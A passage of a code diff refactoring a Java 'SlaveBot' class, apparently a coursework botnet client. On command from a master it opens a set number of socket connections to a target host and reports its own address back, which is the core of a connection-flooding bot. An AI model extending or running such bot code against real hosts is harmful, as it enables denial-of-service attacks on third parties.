@@ -25,6 +25,7 @@ public class SlaveBot implements Runnable {
 			this.targetHost = targetHost;   
 			this.numConnections = numConnections;
 			this.action = action;
+			this.arrSoc = new ArrayList<Socket>();
 
 		}                                                                                                                 
 	}
@@ -70,10 +71,20 @@ public class SlaveBot implements Runnable {
 		*/
 
 		if (action.contentEquals("connect")){
-			// go create a object and insert into the hash table value
-			targetData targetObj = new targetData(action, targetHostName, targetPortNumber, numberOfConn);
-			targetDataMap.put(uniqueKey, targetObj);
-			performConnect(targetObj.targetHost, targetObj.port, targetObj.numConnections);
+			// go create a object and insert into the hash table value first time
+			targetData targetObj;
+			
+			if (targetDataMap.containsKey(uniqueKey) == false)
+			{
+				targetObj = new targetData(action, targetHostName, targetPortNumber, numberOfConn);
+				targetDataMap.put(uniqueKey, targetObj);
+			}
+			else
+			{
+				targetObj =  targetDataMap.get(uniqueKey);
+			}
+			
+			performConnect(targetObj.targetHost, targetObj.port, numberOfConn);
 		}
 		else if (action.contentEquals("disconnect")){
 			// go get the object from the hash-table
@@ -101,7 +112,7 @@ public class SlaveBot implements Runnable {
 			String local_host = client_socket.getInetAddress().getHostAddress();
 
 			System.out.println(ip + slavePort_int + local_host); //print here in slave just to confirm
-
+			
 			out.println(ip +","+ slavePort_int + "," + local_host);
 			return slavePort_int;
 
@@ -119,8 +130,7 @@ public class SlaveBot implements Runnable {
 		Integer portInt = Integer.parseInt(port);
 		targetData obj = targetDataMap.get(conKey);
 		
-		//obj.arrSoc = new Socket[numConnectionInt];
-		obj.arrSoc = new ArrayList<Socket>();
+		//obj.arrSoc = new Socket[numConnectionInt];		
 		if (targetDataMap.containsKey(conKey)){
 			try{
 				for(int i = 0; i < Integer.parseInt(numConnection); i++){
@@ -138,7 +148,6 @@ public class SlaveBot implements Runnable {
 		else{
 			System.out.println("Error Connecting to host");
 		}
-		System.out.println("Blah");
 	}
 
 	public static void performDisconnect(String ip, String port, Integer numberOfConnToDelete) {
